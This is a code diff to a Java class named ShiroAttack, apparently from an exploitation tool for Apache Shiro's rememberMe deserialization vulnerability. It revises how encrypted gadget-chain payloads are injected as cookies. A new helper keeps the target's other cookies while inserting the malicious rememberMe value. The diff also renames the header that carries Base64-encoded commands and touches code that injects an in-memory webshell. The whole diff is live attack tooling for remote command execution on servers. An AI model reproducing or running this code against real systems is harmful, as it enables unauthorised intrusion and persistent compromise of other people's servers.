@@ -40,8 +40,7 @@ public class ShiroAttack {
         } else {
             headers = (HashMap<String, String>) reqMsg.get("headers");
             String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
-            headers.put("Cookie", cookieFlag + "=1");
-
+            headers.put("Cookie", getCookie(headers, cookieFlag, "1"));
             if (Objects.equals(reqMsg.get("method"), "POST"))
                 response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
             else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
@@ -67,8 +66,7 @@ public class ShiroAttack {
         } else {
             headers = (HashMap<String, String>) reqMsg.get("headers");
             String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
-            headers.put("Cookie", cookieFlag + "=" + cookie);
-
+            headers.put("Cookie", getCookie(headers, cookieFlag, cookie));
             if (Objects.equals(reqMsg.get("method"), "POST"))
                 response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
             else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
@@ -86,8 +84,7 @@ public class ShiroAttack {
         } else {
             headers = (HashMap<String, String>) reqMsg.get("headers");
             String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
-            headers.put("Cookie", GadgetPayload(chain, echo, key, cookieFlag));
-
+            headers.put("Cookie", getCookie(headers, cookieFlag, GadgetPayload(chain, echo, key, cookieFlag)));
             if (Objects.equals(reqMsg.get("method"), "POST"))
                 response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
             else response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
@@ -101,13 +98,13 @@ public class ShiroAttack {
         Response response;
         if (!complexReq) {
             headers.put("Cookie", GadgetPayload(chain, echo, key, cookieFlag));
-            headers.put("Authorization", "Basic " + Base64.encode(cmd));
+            headers.put("Authorizations", "Basic " + Base64.encode(cmd));
             response = HttpUtils.get(url, headers, Config.DEFAULT_ENCODING);
         } else {
             headers = (HashMap<String, String>) reqMsg.get("headers");
             String data = HttpMsgUtil.mapToUrlEncodedString((Map<String, String>) reqMsg.get("data"));
-            headers.put("Cookie", GadgetPayload(chain, echo, key, cookieFlag));
-            headers.put("Authorization", "Basic " + Base64.encode(cmd));
+            headers.put("Cookie", getCookie(headers, cookieFlag, GadgetPayload(chain, echo, key, cookieFlag)));
+            headers.put("Authorizations", "Basic " + Base64.encode(cmd));
 
             if (Objects.equals(reqMsg.get("method"), "POST"))
                 response = HttpUtils.post(url, data, headers, Config.DEFAULT_ENCODING);
@@ -143,7 +140,7 @@ public class ShiroAttack {
             response = HttpUtils.post(url, shellBody, headers, Config.DEFAULT_ENCODING);
         } else {
             headers = (HashMap<String, String>) reqMsg.get("headers");
-            headers.put("Cookie", ShiroAttack.GadgetPayload(chain, "InjectMemTool", key, cookieFlag));
+            headers.put("Cookie", getCookie(headers, cookieFlag, ShiroAttack.GadgetPayload(chain, "InjectMemTool", key, cookieFlag)));
             headers.put("path", path);
             Map<String, String> dataMap = (Map<String, String>) reqMsg.get("data");
             dataMap.put("user", MemBytes.getBytes(memShell));
@@ -201,24 +198,12 @@ public class ShiroAttack {
         if (AES_GCM_MODE) {
             ShiroGCM shiroGCM = new ShiroGCM();
             String byteSource = shiroGCM.encrypt(key,serpayload);
-//            System.out.println(shiroKeyWord + "=" + byteSource);
             return shiroKeyWord + "=" + byteSource;
 
         } else {
             encryptpayload = AesUtil.encrypt(serpayload, bkey);
             return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
         }
-    }
-
-    public static boolean isUniqueString (String str){
-        String ch = "deleteMe";
-        Map<Character, Integer> map = new HashMap<>();
-        for (int i = 0; i < str.length(); i++) {
-            char c = str.charAt(i);
-            map.put(Character.valueOf(c), Integer.valueOf(((Integer) map.getOrDefault(Character.valueOf(c), Integer.valueOf(0))).intValue() + 1));
-        }
-        int count = ((Integer) map.getOrDefault(Character.valueOf(ch.charAt(0)), Integer.valueOf(0))).intValue();
-        return (count == 1);
     }
 
     // 从文件读取所有key
@@ -242,5 +227,38 @@ public class ShiroAttack {
             count++;
         }
         return count;
+    }
+
+    // 处理cookie，配置是否保留原始Cookie值
+    private static String getCookie(HashMap<String, String> headers, String cookieFlag, String attackCookie) {
+        // 去除多余flag
+        attackCookie = StrUtil.removeAll(attackCookie, cookieFlag + "=");
+        // 没原始cookie，不存在保留原始内容，直接返回cookie payload
+        if (headers.get("Cookie") == null)
+            return cookieFlag + "=" +  attackCookie;
+        // 有cookie，需要处理两种情况：
+        //    1、原始cookie内容中包含rememberMe
+        //    2、原始cookie内容中不包含rememberMe
+        else {
+            // 1、原始cookie内容中包含rememberMe
+            if (headers.get("Cookie").contains(cookieFlag + "=")) {
+                StringBuilder cookieRes = new StringBuilder();;
+                List<String> cookieArray = new ArrayList<>(Arrays.asList(headers.get("Cookie").split(";")));
+                // 原始cookie只有rememberMe一项，无需保留，直接返回cookie payload
+                if (cookieArray.size() == 1)
+                    return cookieFlag + "=" +  attackCookie;
+                // 原始cookie除了rememberMe还有其他项，需要保留的是其它项
+                else {
+                    for (String cookie : cookieArray) {
+                        if (!cookie.contains(cookieFlag + "="))
+                            cookieRes.append(cookie).append("; ");
+                    }
+                    cookieRes.append(cookieFlag + "=" + attackCookie);
+                    return cookieRes.toString();
+                }
+            }
+            // 2、原始cookie内容中不包含rememberMe，直接拼接即可
+            else return headers.get("Cookie") + "; " + cookieFlag + "=" +  attackCookie;
+        }
     }
 }
